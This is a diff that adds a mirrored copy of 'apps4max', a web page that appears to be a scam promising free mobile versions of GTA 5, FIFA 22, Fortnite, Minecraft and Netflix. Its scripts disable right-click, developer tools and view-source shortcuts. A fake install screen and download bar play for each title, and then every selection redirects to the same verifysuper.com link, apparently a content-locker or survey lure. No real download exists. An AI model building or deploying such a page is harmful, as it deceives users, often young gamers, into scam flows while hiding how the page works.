@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from apps4max.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 09 Oct 2022 21:26:04 GMT -->
+<head>
+    <title>apps4max - Free Games & Apps</title>
+
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="stylesheet" href="css/responsev.css" />
+    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+
+    <script src="js/jquery.min.js"></script>
+    <script>
+        $(document).keydown(function(event){
+            if(event.keyCode==123){
+                return false;
+            }
+            else if (event.ctrlKey && event.shiftKey && event.keyCode==73){        
+                    return false;
+            }
+        });
+
+        $(document).on("contextmenu",function(e){        
+        e.preventDefault();
+        });
+
+        document.onkeydown = function(e) {
+            if (e.ctrlKey && 
+                (e.keyCode === 67 || 
+                e.keyCode === 86 || 
+                e.keyCode === 85 || 
+                e.keyCode === 117)) {
+                return false;
+            } else {
+                return true;
+            }
+        };
+        $(document).keypress("u",function(e) {
+            if(e.ctrlKey){
+                return false;
+            } else{
+                return true;
+            }
+        });
+    </script>
+</head>
+<body>
+
+    <input type="hidden" id="gamefordown" value="">
+
+    <div class="loading hide" id="loading_page">
+        <div class="loader" id="loading_circle"></div>
+
+        <div class="gamemaker hide" id="gamemaker">
+            <div class="fakemobile">
+                <a href="#" class="close_btn">X</a>
+                <div class="iphone-display">
+                    <div class="app-icon-area">
+                        <div class="app-icon-region">
+                            <img id="app_icon" alt="app icon" src="img/LCRX9SW/gta5.jpg" class="app-modal-icon" style="width: 33px; height: 33px;">
+                        </div>
+                        <div class="fake-homescreen-app-name">
+                            <span id="app_name" class="installingAppName">GTA 5</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="gameinfo">
+                <p class="gamenameinfo" id="gamenameinfo">Game Name</p>
+                <div class="down_buttons choosed_device" id="choosed_device"><!-- android_choosed _ ios_choosed -->
+                    <span>Choosed device :</span>
+                    <button class="ios" style="margin-right: 0;"><img src="img/app-store.png" alt=""> IOS</button>
+                    <button class="android"><img src="img/android.png" alt=""> ANDROID</button>
+                </div>
+                <div class="download_button">
+                    <button id="download_button">Download</button>
+                </div>
+                <p class="downgame">Download your game for free</p>
+
+                <div class="block_gameinfo hide gta_down" id="block_gameinfo">
+                    <p class="downtop">Downloading...</p>
+                    <p class="downbottom">Downloading</p>
+                    <div class="loadbar">
+                        <div class="loadbarvalue"></div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+
+    <header>
+        <div class="logo">
+            <img src="img/logo2.png" alt="">
+        </div>
+    </header>
+
+    <div class="main">
+        <div class="container">
+
+            <!-- START APP -->
+            <div class="app_container">
+                <div class="app_image">
+                    <img src="img/LCRX9SW/gta5.jpg" alt="">
+                    <p>Latest: <b>3.2.1</b></p>
+                </div>
+                <div class="app_info">
+                    <p class="app_name">GTA 5 Mobile</p>
+
+                    <div class="items">
+                        <span class="item_span user_span"><img src="img/user.png" alt=""> 640.779</span>
+                        <span class="item_span down_span"><img src="img/download.png" alt=""> Download</span>
+                    </div>
+
+                    <p class="choose_device">Choose your device</p>
+
+                    <div class="down_buttons">
+                        <button class="ios" id="gtaios"><img src="img/app-store.png" alt=""> IOS</button>
+                        <button class="android" id="gtaandroid"><img src="img/android.png" alt=""> ANDROID</button>
+                    </div>
+
+                    <div class="rating">
+                        <img src="img/star.png" alt=""><span>4.7</span>
+                    </div>
+
+                </div>
+            </div>
+            <!-- END APP -->
+
+            <!-- START APP -->
+            <div class="app_container">
+                <div class="app_image">
+                    <img src="img/n87Lqr4/fifa22.jpg" alt="">
+                    <p>Latest: <b>2.4.1</b></p>
+                </div>
+                <div class="app_info">
+                    <p class="app_name">FIFA 22 Mobile</p>
+
+                    <div class="items">
+                        <span class="item_span user_span"><img src="img/user.png" alt=""> 359.415</span>
+                        <span class="item_span down_span"><img src="img/download.png" alt=""> Download</span>
+                    </div>
+
+                    <p class="choose_device">Choose your device</p>
+
+                    <div class="down_buttons">
+                        <button class="ios" id="fifaios"><img src="img/app-store.png" alt=""> IOS</button>
+                        <button class="android" id="fifaandroid"><img src="img/android.png" alt=""> ANDROID</button>
+                    </div>
+
+                    <div class="rating">
+                        <img src="img/star.png" alt=""><span>4.9</span>
+                    </div>
+
+                </div>
+            </div>
+            <!-- END APP -->
+
+            <!-- START APP -->
+            <div class="app_container">
+                <div class="app_image">
+                    <img src="img/T4Dbd9T/wwe.jpg" alt="">
+                    <p>Latest: <b>4.2.2</b></p>
+                </div>
+                <div class="app_info">
+                    <p class="app_name">WWE 2K22</p>
+
+                    <div class="items">
+                        <span class="item_span user_span"><img src="img/user.png" alt=""> 223.468</span>
+                        <span class="item_span down_span"><img src="img/download.png" alt=""> Download</span>
+                    </div>
+
+                    <p class="choose_device">Choose your device</p>
+
+                    <div class="down_buttons">
+                        <button class="ios" id="wweios"><img src="img/app-store.png" alt=""> IOS</button>
+                        <button class="android" id="wweandroid"><img src="img/android.png" alt=""> ANDROID</button>
+                    </div>
+
+                    <div class="rating">
+                        <img src="img/star.png" alt=""><span>4.8</span>
+                    </div>
+
+                </div>
+            </div>
+            <!-- END APP -->
+
+            <!-- START APP -->
+            <div class="app_container">
+                <div class="app_image">
+                    <img src="img/Tcjj6RJ/nba.jpg" alt="">
+                    <p>Latest: <b>1.8.9</b></p>
+                </div>
+                <div class="app_info">
+                    <p class="app_name">NBA 2K22</p>
+
+                    <div class="items">
+                        <span class="item_span user_span"><img src="img/user.png" alt=""> 221.906</span>
+                        <span class="item_span down_span"><img src="img/download.png" alt=""> Download</span>
+                    </div>
+
+                    <p class="choose_device">Choose your device</p>
+
+                    <div class="down_buttons">
+                        <button class="ios" id="nbaios"><img src="img/app-store.png" alt=""> IOS</button>
+                        <button class="android" id="nbaandroid"><img src="img/android.png" alt=""> ANDROID</button>
+                    </div>
+
+                    <div class="rating">
+                        <img src="img/star.png" alt=""><span>4.8</span>
+                    </div>
+
+                </div>
+            </div>
+            <!-- END APP -->
+
+            <!-- START APP -->
+            <div class="app_container">
+                <div class="app_image">
+                    <img src="img/vQbkjr5/nfl.jpg" alt="">
+                    <p>Latest: <b>1.2.4</b></p>
+                </div>
+                <div class="app_info">
+                    <p class="app_name">NFL 2K22</p>
+
+                    <div class="items">
+                        <span class="item_span user_span"><img src="img/user.png" alt=""> 219.903</span>
+                        <span class="item_span down_span"><img src="img/download.png" alt=""> Download</span>
+                    </div>
+
+                    <p class="choose_device">Choose your device</p>
+
+                    <div class="down_buttons">
+                        <button class="ios" id="nflios"><img src="img/app-store.png" alt=""> IOS</button>
+                        <button class="android" id="nflandroid"><img src="img/android.png" alt=""> ANDROID</button>
+                    </div>
+
+                    <div class="rating">
+                        <img src="img/star.png" alt=""><span>4.8</span>
+                    </div>
+
+                </div>
+            </div>
+            <!-- END APP -->
+
+            <!-- START APP -->
+            <div class="app_container">
+                <div class="app_image">
+                    <img src="img/0CngpLK/fortnite.jpg" alt="">
+                    <p>Latest: <b>1.3.7</b></p>
+                </div>
+                <div class="app_info">
+                    <p class="app_name">FORTNITE</p>
+
+                    <div class="items">
+                        <span class="item_span user_span"><img src="img/user.png" alt=""> 219.663</span>
+                        <span class="item_span down_span"><img src="img/download.png" alt=""> Download</span>
+                    </div>
+
+                    <p class="choose_device">Choose your device</p>
+
+                    <div class="down_buttons">
+                        <button class="ios" id="fortniteios"><img src="img/app-store.png" alt=""> IOS</button>
+                        <button class="android" id="fortniteandroid"><img src="img/android.png" alt=""> ANDROID</button>
+                    </div>
+
+                    <div class="rating">
+                        <img src="img/star.png" alt=""><span>4.5</span>
+                    </div>
+
+                </div>
+            </div>
+            <!-- END APP -->
+
+            <!-- START APP -->
+            <div class="app_container">
+                <div class="app_image">
+                    <img src="img/FgGRgJr/spiderman.jpg" alt="">
+                    <p>Latest: <b>1.1.3</b></p>
+                </div>
+                <div class="app_info">
+                    <p class="app_name">SPIDERMAN</p>
+
+                    <div class="items">
+                        <span class="item_span user_span"><img src="img/user.png" alt=""> 212.637</span>
+                        <span class="item_span down_span"><img src="img/download.png" alt=""> Download</span>
+                    </div>
+
+                    <p class="choose_device">Choose your device</p>
+
+                    <div class="down_buttons">
+                        <button class="ios" id="spidermanios"><img src="img/app-store.png" alt=""> IOS</button>
+                        <button class="android" id="spidermanandroid"><img src="img/android.png" alt=""> ANDROID</button>
+                    </div>
+
+                    <div class="rating">
+                        <img src="img/star.png" alt=""><span>4.7</span>
+                    </div>
+
+                </div>
+            </div>
+            <!-- END APP -->
+
+            <!-- START APP -->
+            <div class="app_container">
+                <div class="app_image">
+                    <img src="img/Q645Kw8/minecraft.jpg" alt="">
+                    <p>Latest: <b>6.2.7</b></p>
+                </div>
+                <div class="app_info">
+                    <p class="app_name">MINECRAFT</p>
+
+                    <div class="items">
+                        <span class="item_span user_span"><img src="img/user.png" alt=""> 150.970</span>
+                        <span class="item_span down_span"><img src="img/download.png" alt=""> Download</span>
+                    </div>
+
+                    <p class="choose_device">Choose your device</p>
+
+                    <div class="down_buttons">
+                        <button class="ios" id="minecraftios"><img src="img/app-store.png" alt=""> IOS</button>
+                        <button class="android" id="minecraftandroid"><img src="img/android.png" alt=""> ANDROID</button>
+                    </div>
+
+                    <div class="rating">
+                        <img src="img/star.png" alt=""><span>4.9</span>
+                    </div>
+
+                </div>
+            </div>
+            <!-- END APP -->
+
+            <!-- START APP -->
+            <div class="app_container">
+                <div class="app_image">
+                    <img src="img/PCFTbH2/netflix.jpg" alt="">
+                    <p>Latest: <b>5.9.4</b></p>
+                </div>
+                <div class="app_info">
+                    <p class="app_name">FREE NETFLIX</p>
+
+                    <div class="items">
+                        <span class="item_span user_span"><img src="img/user.png" alt=""> 123.014</span>
+                        <span class="item_span down_span"><img src="img/download.png" alt=""> Download</span>
+                    </div>
+
+                    <p class="choose_device">Choose your device</p>
+
+                    <div class="down_buttons">
+                        <button class="ios" id="netflixios"><img src="img/app-store.png" alt=""> IOS</button>
+                        <button class="android" id="netflixandroid"><img src="img/android.png" alt=""> ANDROID</button>
+                    </div>
+
+                    <div class="rating">
+                        <img src="img/star.png" alt=""><span>4.9</span>
+                    </div>
+
+                </div>
+            </div>
+            <!-- END APP -->
+    
+        </div>
+    </div>
+    
+
+    <script>
+        $(document).ready(function(){
+
+            // START GTA 5
+
+            $("#gtaios").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("ios_choosed");
+                    $('#gamenameinfo').text('GTA 5 MOBILE');
+
+                    $('#app_name').text('GTA 5');
+                    $("#app_icon").attr("src","img/LCRX9SW/gta5.jpg");
+
+                    $('#gamefordown').val('gta5');
+                },2000);
+            });
+
+            $("#gtaandroid").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("android_choosed");
+                    $('#gamenameinfo').text('GTA 5 MOBILE');
+                    
+                    $('#app_name').text('GTA 5');
+                    $("#app_icon").attr("src","img/LCRX9SW/gta5.jpg");
+
+                    $('#gamefordown').val('gta5');
+                },2000);
+            });
+
+            // END GTA 5
+
+            // START FIFA 22
+            
+            $("#fifaios").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("ios_choosed");
+                    $('#gamenameinfo').text('FIFA 22 MOBILE');
+
+                    $('#app_name').text('FIFA 22');
+                    $("#app_icon").attr("src","img/n87Lqr4/fifa22.jpg");
+
+                    $('#gamefordown').val('fifa22');
+                },2000);
+            });
+
+            $("#fifaandroid").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("android_choosed");
+                    $('#gamenameinfo').text('FIFA 22 MOBILE');
+
+                    $('#app_name').text('FIFA 22');
+                    $("#app_icon").attr("src","img/n87Lqr4/fifa22.jpg");
+
+                    $('#gamefordown').val('fifa22');
+                },2000);
+            });
+
+            // END FIFA 22
+
+            // START WWE
+            
+            $("#wweios").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("ios_choosed");
+                    $('#gamenameinfo').text('WWE 2K22 MOBILE');
+
+                    $('#app_name').text('WWE 2K22');
+                    $("#app_icon").attr("src","img/T4Dbd9T/wwe.jpg");
+
+                    $('#gamefordown').val('wwe');
+                },2000);
+            });
+
+            $("#wweandroid").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("android_choosed");
+                    $('#gamenameinfo').text('WWE 2K22 MOBILE');
+
+                    $('#app_name').text('WWE 2K22');
+                    $("#app_icon").attr("src","img/T4Dbd9T/wwe.jpg");
+
+                    $('#gamefordown').val('wwe');
+                },2000);
+            });
+
+            // END WWE
+
+            // START NBA
+            
+            $("#nbaios").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("ios_choosed");
+                    $('#gamenameinfo').text('NBA 2K22 MOBILE');
+
+                    $('#app_name').text('NBA 2K22');
+                    $("#app_icon").attr("src","img/Tcjj6RJ/nba.jpg");
+
+                    $('#gamefordown').val('nba');
+                },2000);
+            });
+
+            $("#nbaandroid").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("android_choosed");
+                    $('#gamenameinfo').text('NBA 2K22 MOBILE');
+
+                    $('#app_name').text('NBA 2K22');
+                    $("#app_icon").attr("src","img/Tcjj6RJ/nba.jpg");
+
+                    $('#gamefordown').val('nba');
+                },2000);
+            });
+
+            // END NBA
+
+            // START NFL
+            
+            $("#nflios").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("ios_choosed");
+                    $('#gamenameinfo').text('NFL 2K22 MOBILE');
+
+                    $('#app_name').text('NFL 2K22');
+                    $("#app_icon").attr("src","img/vQbkjr5/nfl.jpg");
+
+                    $('#gamefordown').val('nfl');
+                },2000);
+            });
+
+            $("#nflandroid").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("android_choosed");
+                    $('#gamenameinfo').text('NFL 2K22 MOBILE');
+
+                    $('#app_name').text('NFL 2K22');
+                    $("#app_icon").attr("src","img/vQbkjr5/nfl.jpg");
+
+                    $('#gamefordown').val('nfl');
+                },2000);
+            });
+
+            // END NFL
+
+            // START FORTNITE
+            
+            $("#fortniteios").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("ios_choosed");
+                    $('#gamenameinfo').text('FORTNITE MOBILE');
+
+                    $('#app_name').text('FORTNITE');
+                    $("#app_icon").attr("src","img/0CngpLK/fortnite.jpg");
+
+                    $('#gamefordown').val('fortnite');
+                },2000);
+            });
+
+            $("#fortniteandroid").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("android_choosed");
+                    $('#gamenameinfo').text('FORTNITE MOBILE');
+
+                    $('#app_name').text('FORTNITE');
+                    $("#app_icon").attr("src","img/0CngpLK/fortnite.jpg");
+
+                    $('#gamefordown').val('fortnite');
+                },2000);
+            });
+
+            // END FORTNITE
+
+            // START SPIDERMAN
+            
+            $("#spidermanios").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("ios_choosed");
+                    $('#gamenameinfo').text('SPIDERMAN MOBILE');
+
+                    $('#app_name').text('SPIDERMAN');
+                    $("#app_icon").attr("src","img/FgGRgJr/spiderman.jpg");
+
+                    $('#gamefordown').val('spiderman');
+                },2000);
+            });
+
+            $("#spidermanandroid").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("android_choosed");
+                    $('#gamenameinfo').text('SPIDERMAN MOBILE');
+
+                    $('#app_name').text('SPIDERMAN');
+                    $("#app_icon").attr("src","img/FgGRgJr/spiderman.jpg");
+
+                    $('#gamefordown').val('spiderman');
+                },2000);
+            });
+
+            // END SPIDERMAN
+
+            // START MINECRAFT
+            
+            $("#minecraftios").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("ios_choosed");
+                    $('#gamenameinfo').text('MINECRAFT MOBILE');
+
+                    $('#app_name').text('MINECRAFT');
+                    $("#app_icon").attr("src","img/Q645Kw8/minecraft.jpg");
+
+                    $('#gamefordown').val('minecraft');
+                },2000);
+            });
+
+            $("#minecraftandroid").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("android_choosed");
+                    $('#gamenameinfo').text('MINECRAFT MOBILE');
+
+                    $('#app_name').text('MINECRAFT');
+                    $("#app_icon").attr("src","img/Q645Kw8/minecraft.jpg");
+
+                    $('#gamefordown').val('minecraft');
+                },2000);
+            });
+
+            // END MINECRAFT
+
+            // START NETFLIX
+            
+            $("#netflixios").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("ios_choosed");
+                    $('#gamenameinfo').text('FREE NETFLIX');
+
+                    $('#app_name').text('NETFLIX');
+                    $("#app_icon").attr("src","img/PCFTbH2/netflix.jpg");
+
+                    $('#gamefordown').val('netflix');
+                },2000);
+            });
+
+            $("#netflixandroid").click(function(){
+                $("#loading_page").removeClass("hide");
+                setTimeout(function() {
+                    $("#loading_circle").addClass("hide");
+                    $("#gamemaker").removeClass("hide");
+                    $("#choosed_device").addClass("android_choosed");
+                    $('#gamenameinfo').text('FREE NETFLIX');
+
+                    $('#app_name').text('NETFLIX');
+                    $("#app_icon").attr("src","img/PCFTbH2/netflix.jpg");
+
+                    $('#gamefordown').val('netflix');
+                },2000);
+            });
+
+            // END NETFLIX
+
+
+            $("#download_button").click(function(){
+                $("#block_gameinfo").removeClass("hide");
+                setTimeout(function() {
+                    var game = $('#gamefordown').val();
+
+                    // CHECK GAMES
+                    if( game == "gta5"){
+                        window.location = "https://verifysuper.com/cl/i/o68jlq";
+                    } else if ( game == "fifa22"){
+                        window.location = "https://verifysuper.com/cl/i/o68jlq";
+                    } else if ( game == "wwe"){
+                        window.location = "https://verifysuper.com/cl/i/o68jlq";
+                    } else if ( game == "nba"){
+                        window.location = "https://verifysuper.com/cl/i/o68jlq";
+                    } else if ( game == "nfl"){
+                        window.location = "https://verifysuper.com/cl/i/o68jlq";
+                    } else if ( game == "fortnite"){
+                        window.location = "https://verifysuper.com/cl/i/o68jlq";
+                    } else if ( game == "spiderman"){
+                        window.location = "https://verifysuper.com/cl/i/o68jlq";
+                    } else if ( game == "minecraft"){
+                        window.location = "https://verifysuper.com/cl/i/o68jlq";
+                    } else if ( game == "netflix"){
+                        window.location = "https://verifysuper.com/cl/i/o68jlq";
+                    }
+                },10000);
+            });
+        });
+    </script>
+    
+</body>
+
+<!-- Mirrored from apps4max.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 09 Oct 2022 21:26:14 GMT -->
+</html>
